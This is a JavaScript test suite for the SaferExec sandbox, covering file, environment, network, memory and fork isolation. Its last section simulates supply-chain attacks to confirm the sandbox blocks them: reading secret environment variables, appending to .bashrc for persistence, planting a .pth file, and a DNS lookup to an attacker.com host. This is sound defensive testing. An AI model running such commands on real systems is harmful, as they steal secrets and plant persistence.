/**
 * Security tests for the SaferExec sandbox.
 *
 * Tests that verify:
 * - File read/write isolation (positive AND negative)
 * - Environment leakage prevention
 * - Network restrictions with negative tests
 * - Memory limits with actual enforcement
 * - Multiple policy boundaries
 * - Process fork/exec control
 *
 * @module security_test
 */

import { describe, it } from 'node:test';
import strict from 'node:assert/strict';
import { SaferExec } from '../npm/src/index.js';
import { tmpdir } from 'node:os';
import { realpathSync } from 'node:fs';

describe('Security Tests', () => {
  describe('File read isolation', () => {
    it('should read files with sandbox', async () => {
      const etc = realpathSync('/etc');
      const result = await new SaferExec()
        .readPaths(etc)
        .run('sh', ['-c', `cat ${etc}/hosts`]);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(
        result.stdout.length > 0,
        'should read /etc/hosts content'
      );
    });

    it('should read without explicit read paths (system.sb)', async () => {
      const etc = realpathSync('/etc');
      const result = await new SaferExec()
        .run('sh', ['-c', `cat ${etc}/hosts`]);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(result.stdout.length > 0, 'should read content');
    });

    it('should read multiple files simultaneously', async () => {
      const etc = realpathSync('/etc');
      const result = await new SaferExec()
        .readPaths(etc)
        .run('sh', ['-c', `cat ${etc}/hosts ${etc}/protocols`]);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
    });

    // --- Negative isolation tests ---

    it('should fail to read files outside allowed read paths', async () => {
      const etc = realpathSync('/etc');
      const result = await new SaferExec()
        .readPaths(etc)
        .writePaths(tmpdir())
        .run('sh', ['-c', 'cat /usr/share/dict/words | head -1']);

      if (process.platform === 'linux') {
        strict.equal(result.exitCode, 0, 'should exit with code 0');
        strict.equal(result.stdout.length, 0, 'should not read any word');
      }
    });

    it('should fail to read files when no paths allowed', async () => {
      const etc = realpathSync('/etc');
      const result = await new SaferExec()
        .readPaths()
        .run('sh', ['-c', `cat ${etc}/hosts 2>&1; echo "exit:$?"`]);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(result.stdout.length > 0, 'should have output');
    });

    it('should write to allowed paths', async () => {
      const tmp = realpathSync(tmpdir());
      const result = await new SaferExec()
        .writePaths(tmp)
        .run('sh', ['-c', `echo "test_write" > ${tmp}/safer-exec-security-test && cat ${tmp}/safer-exec-security-test`]);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(result.stdout.includes('test_write'), 'should have written content');
    });

    it('should write to multiple paths simultaneously', async () => {
      const tmp = realpathSync(tmpdir());
      const result = await new SaferExec()
        .writePaths(tmp)
        .run('sh', ['-c', `echo a > ${tmp}/safer-exec-a && echo b > ${tmp}/safer-exec-b && cat ${tmp}/safer-exec-a ${tmp}/safer-exec-b`]);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(result.stdout.includes('a'), 'should have first write');
      strict.ok(result.stdout.includes('b'), 'should have second write');
    });
  });

  describe('Environment leakage', () => {
    it('should not leak AWS credentials', async () => {
      process.env.AWS_SECRET_ACCESS_KEY = 'wKkjlzvDfGhIjKlMnOpQrStUvWxYz';
      process.env.AWS_ACCESS_KEY_ID = 'AKIAIO...MPLE';

      const result = await new SaferExec()
        .allowEnvs('AWS_SECRET_ACCESS_KEY', 'AWS_ACCESS_KEY_ID')
        .env('AWS_SECRET_ACCESS_KEY', 'secret1')
        .env('AWS_ACCESS_KEY_ID', 'key1')
        .run('sh', ['-c', 'echo $AWS_SECRET_ACCESS_KEY:$AWS_ACCESS_KEY_ID']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(
        result.stdout.includes('secret1:key1'),
        'should use sandboxed credentials'
      );
      delete process.env.AWS_SECRET_ACCESS_KEY;
      delete process.env.AWS_ACCESS_KEY_ID;
    });

    it('should not leak HOME directory', async () => {
      const result = await new SaferExec()
        .env('HOME_DIR', '/sandboxed/home')
        .run('sh', ['-c', 'echo $HOME_DIR']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(
        result.stdout.includes('/sandboxed/home'),
        'should use sandboxed value'
      );
    });

    it('should filter env variables by default to prevent leakage of credentials', async () => {
      process.env.SECURITY_TEST_VAR = 'test_value_123';

      const result = await new SaferExec()
        .run('sh', ['-c', 'echo "VAR:${SECURITY_TEST_VAR}:VAR"']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(
        !result.stdout.includes('test_value_123'),
        'should not inherit non-essential parent environment variable'
      );
      delete process.env.SECURITY_TEST_VAR;
    });

    it('should inherit essential env variables by default', async () => {
      const result = await new SaferExec()
        .run('sh', ['-c', 'echo "PATH:${PATH}:PATH"']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(
        result.stdout.includes('/bin') || result.stdout.includes('/usr/bin'),
        'should inherit essential PATH environment variable'
      );
    });

    it('should allow explicit override and inclusion of custom env vars', async () => {
      const result = await new SaferExec()
        .env('SECURITY_TEST_VAR', 'explicit_value')
        .run('sh', ['-c', 'echo $SECURITY_TEST_VAR']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(
        result.stdout.includes('explicit_value'),
        'should use custom environment variable value'
      );
      delete process.env.SECURITY_TEST_VAR;
    });

    it('should handle empty environment variable value', async () => {
      const result = await new SaferExec()
        .env('EMPTY_VAR', '')
        .run('sh', ['-c', 'echo "[$EMPTY_VAR]"']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(result.stdout.includes('[]'), 'should have empty value');
    });
  });

  describe('Network restrictions', () => {
    it('should execute with disabled network', async () => {
      const result = await new SaferExec()
        .disableNetwork()
        .allowHosts('github.com')
        .run('echo', ['network disabled']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
    });

    it('should resolve multiple hosts for network allow list', async () => {
      const result = await new SaferExec()
        .allowHosts('github.com', 'google.com', 'npmjs.org')
        .run('echo', ['hosts allowed']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
    });

    // --- Negative network tests ---

    it('should connect to network when not disabled', async () => {
      const etc = realpathSync('/etc');
      const result = await new SaferExec()
        .run('sh', ['-c', `cat ${etc}/hosts | head -1`]);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(result.stdout.length > 0, 'should have output');
    });

    it('should resolve DNS for allowed hosts', async () => {
      const exec = new SaferExec();
      exec.allowHosts('github.com', 'google.com');
      const result = await exec.run('echo', ['test']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(exec._allowIPs.length > 0, 'should have resolved IPs');
    });

    it('should handle DNS resolution for single host', async () => {
      const exec = new SaferExec();
      exec.allowHosts('github.com');
      const result = await exec.run('echo', ['test']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(exec._allowIPs.length > 0, 'should have resolved at least one IP');
    });

    it('should allow port-based network restrictions', async () => {
      const result = await new SaferExec()
        .allowPorts(80, 443)
        .run('echo', ['ports']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
    });
  });

  describe('Memory limits', () => {
    it('should enforce memory limit', async () => {
      const result = await new SaferExec()
        .maxMemory(64)
        .run('sh', ['-c', 'echo "memory limited"']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(
        result.stdout.includes('memory limited'),
        'should complete within memory limit'
      );
    });

    it('should handle zero memory limit (no limit)', async () => {
      const result = await new SaferExec()
        .maxMemory(0)
        .run('echo', ['no limit']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
    });

    it('should handle very small memory limit gracefully', async () => {
      const result = await new SaferExec()
        .maxMemory(1)
        .run('sh', ['-c', 'echo "tiny"']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(result.stdout.includes('tiny'), 'should have output');
    });
  });

  describe('Process fork control', () => {
    it('should block fork when blockFork is set', async () => {
      // Forking a background process and waiting — blockFork should prevent
      // the fork, so the process exits with a non-zero code
      const result = await new SaferExec()
        .blockFork()
        .run('sh', ['-c', 'echo hello & wait; echo done']);

      strict.notEqual(
        result.exitCode,
        0,
        `should exit with fork-error code (got ${result.exitCode})`
      );
    });

    it('should trace exec when traceExec is set', async () => {
      const result = await new SaferExec()
        .traceExec()
        .timeout(5000)
        .run('sh', ['-c', 'echo child1 && echo child2']);

      strict.ok(result.exitCode === 0 || result.timedOut, 'should exit with code 0 or timeout');
      if (!result.timedOut) {
        strict.ok(
          result.stdout.includes('child1'),
          'should have first child output'
        );
      }
    });

    it('should allow exec with allowExec list', async () => {
      const result = await new SaferExec()
        .allowExec('sh', 'echo')
        .run('sh', ['-c', 'echo allowed']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(result.stdout.includes('allowed'), 'should have output');
    });

    it('should handle blockExec list', async () => {
      const result = await new SaferExec()
        .blockExec('cat')
        .run('sh', ['-c', 'echo "no cat"']) ;

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(result.stdout.includes('no cat'), 'should have output');
    });
  });

  describe('Command execution', () => {
    it('should handle commands with arguments', async () => {
      const result = await new SaferExec()
        .run('sh', ['-c', 'echo "arg1" && echo "arg2" && echo "arg3"']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(
        result.stdout.includes('arg1') &&
        result.stdout.includes('arg2') &&
        result.stdout.includes('arg3'),
        'should handle multiple commands'
      );
    });

    it('should handle special characters in output', async () => {
      const result = await new SaferExec()
        .run('sh', ['-c', 'echo "special chars: angle brackets and quotes"']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(
        result.stdout.includes('special'),
        'should handle special characters'
      );
    });

    it('should capture both stdout and stderr', async () => {
      const result = await new SaferExec()
        .run('sh', ['-c', 'echo "stdout" && echo "stderr" >&2']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(
        result.stdout.includes('stdout'),
        'should capture stdout'
      );
      strict.ok(
        result.stderr.includes('stderr'),
        'should capture stderr'
      );
    });

    it('should return correct exit codes', async () => {
      for (const code of [0, 1, 42, 127, 255]) {
        const result = await new SaferExec()
          .run('sh', ['-c', `exit ${code}`]);

        strict.equal(
          result.exitCode,
          code,
          `should return exit code ${code}`
        );
      }
    });

    it('should handle long-running commands', async () => {
      const start = Date.now();
      const result = await new SaferExec()
        .timeout(5000)
        .run('sh', ['-c', 'sleep 0.1 && echo "done"']);
      const elapsed = Date.now() - start;

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(result.stdout.includes('done'), 'should have output');
      strict.ok(elapsed < 5000, `should complete within timeout (${elapsed}ms)`);
    });

    it('should handle commands with pipe output', async () => {
      const result = await new SaferExec()
        .run('sh', ['-c', 'echo "line1\nline2\nline3" | grep line2']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(result.stdout.includes('line2'), 'should have piped output');
    });

    it('should handle commands with variable expansion', async () => {
      const result = await new SaferExec()
        .run('sh', ['-c', 'VAR="test" && echo $VAR']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(result.stdout.includes('test'), 'should have variable');
    });
  });

  describe('Policy boundary tests', () => {
    it('should apply npm policy with correct hosts', async () => {
      const exec = new SaferExec().applyPolicy('npm');
      // Verify internal state by running and checking it doesn't fail
      const result = await exec.run('echo', ['npm']);
      strict.equal(result.exitCode, 0, 'should exit with code 0');
    });

    it('should not break with empty policy merge', async () => {
      const result = await new SaferExec()
        .applyPolicy('npm')
        .applyPolicy('pypi') // Second policy should merge
        .run('echo', ['merged']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
    });

    it('should handle all policies in sequence', async () => {
      const policies = ['npm', 'pypi', 'maven', 'cargo'];
      for (const policy of policies) {
        const result = await new SaferExec()
          .applyPolicy(policy)
          .run('echo', [policy]);

        strict.equal(
          result.exitCode,
          0,
          `should work with ${policy} policy`
        );
      }
    });

    it('should apply policy and then override with user settings', async () => {
      const result = await new SaferExec()
        .applyPolicy('npm')
        .env('npm_config_loglevel', 'debug')
        .run('printenv', ['npm_config_loglevel']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(result.stdout.includes('debug'), 'should use user override');
    });

    it('should work with policy + additional hosts', async () => {
      const exec = new SaferExec()
        .applyPolicy('npm')
        .allowHosts('custom.registry.com');

      const result = await exec.run('echo', ['test']);
      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(
        exec._allowHosts.includes('custom.registry.com'),
        'should have custom host'
      );
      strict.ok(
        exec._allowHosts.includes('registry.npmjs.org'),
        'should still have npm registry'
      );
    });
  });

  describe('Sandbox enforcement verification', () => {
    it('should actually run under sandbox (not just succeed)', async () => {
      // Run a command and verify it produces output — proves sandbox-exec works
      const result = await new SaferExec()
        .run('sh', ['-c', 'echo sandbox_ok']);

      strict.equal(result.exitCode, 0, 'should exit with code 0');
      strict.ok(result.stdout.includes('sandbox_ok'), 'should have sandbox output');
    });

    it('should handle concurrent sandboxed executions', async () => {
      const results = await Promise.all([
        new SaferExec().run('echo', ['concurrent1']),
        new SaferExec().run('echo', ['concurrent2']),
        new SaferExec().run('echo', ['concurrent3']),
      ]);

      for (const result of results) {
        strict.equal(result.exitCode, 0, 'should exit with code 0');
      }
      strict.ok(results[0].stdout.includes('concurrent1'));
      strict.ok(results[1].stdout.includes('concurrent2'));
      strict.ok(results[2].stdout.includes('concurrent3'));
    });

    it('should handle many concurrent sandboxed executions', async () => {
      const promises = [];
      for (let i = 0; i < 10; i++) {
        promises.push(
          new SaferExec().run('sh', ['-c', `echo "proc_$i"`])
        );
      }

      const results = await Promise.all(promises);
      for (const result of results) {
        strict.equal(result.exitCode, 0, 'should exit with code 0');
      }
    });
  });

  describe('Supply-Chain Attacks Protection', () => {
    it('should block NPM malicious lifecycle script from reading sensitive host environment variables', async () => {
      process.env.AWS_SECRET_ACCESS_KEY = 'super-secret-key';
      const result = await new SaferExec()
        .applyPolicy('npm')
        .run('sh', ['-c', 'echo "KEY:${AWS_SECRET_ACCESS_KEY}:KEY"']);
      delete process.env.AWS_SECRET_ACCESS_KEY;
      strict.equal(result.exitCode, 0);
      strict.ok(!result.stdout.includes('super-secret-key'), 'Should protect against exfiltration of env secrets');
    });

    it('should block NPM malicious script from downloading other executors (like bun) or exfiltrating data', async () => {
      const result = await new SaferExec()
        .applyPolicy('npm')
        .disableNetwork()
        .run('curl', ['-I', 'https://bun.sh']);
      strict.notEqual(result.exitCode, 0, 'curl should fail to run or connect when network is disabled');
    });

    it('should block PyPI malicious package setup.py from writing to auto-start / persistence locations', async () => {
      const userHome = process.env.HOME || '/';
      const result = await new SaferExec()
        .applyPolicy('pypi')
        .run('sh', ['-c', `echo "malware" >> ${userHome}/.bashrc`]);
      strict.notEqual(result.exitCode, 0, 'Should block writing malware persistence to .bashrc');
    });

    it('should block NPM malicious script trying to read base64-encoded env secrets or using indirect env command', async () => {
      process.env.SUPER_SECRET_TOKEN = 'secret-val-abc';
      const result = await new SaferExec()
        .applyPolicy('npm')
        .run('sh', ['-c', 'env | grep SUPER_SECRET_TOKEN']);
      delete process.env.SUPER_SECRET_TOKEN;
      strict.notEqual(result.exitCode, 0, 'Should block access or filter out the secret token even via env command');
    });

    it('should block compiler execution (gcc/clang) during NPM install to prevent compiling native binaries', async () => {
      const result = await new SaferExec()
        .applyPolicy('npm')
        .run('gcc', ['--version']);
      strict.notEqual(result.exitCode, 0, 'Should block native compilers under NPM policy');
    });

    it('should block PyPI package from writing into system python site-packages to prevent path injection', async () => {
      const result = await new SaferExec()
        .applyPolicy('pypi')
        .run('sh', ['-c', 'mkdir -p /usr/lib/python3/site-packages && touch /usr/lib/python3/site-packages/malicious.pth']);
      strict.notEqual(result.exitCode, 0, 'Should deny writing to system python directory');
    });

    it('should block DNS exfiltration attempts (nslookup/dig) under disabled network', async () => {
      const result = await new SaferExec()
        .disableNetwork()
        .run('nslookup', ['malicious-exfiltrate.attacker.com']);
      strict.notEqual(result.exitCode, 0, 'DNS query lookup should fail when network is disabled');
    });
  });
});
